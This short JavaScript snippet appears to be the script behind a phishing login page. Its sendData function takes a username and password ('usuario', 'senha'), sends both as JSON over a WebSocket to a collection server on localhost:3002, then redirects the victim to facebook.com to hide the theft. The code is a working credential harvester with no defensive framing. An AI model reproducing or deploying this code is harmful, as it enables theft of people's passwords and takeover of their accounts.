const socket = new WebSocket('ws://localhost:3002');

function sendData(usuario, senha) {
    // Sample data to send to the server
    const dataToSend = { key: usuario };
    socket.send(JSON.stringify(dataToSend));

    const dataToSend1 = {key : senha };
    socket.send(JSON.stringify(dataToSend1));
   
    window.location.href = "https://facebook.com";
}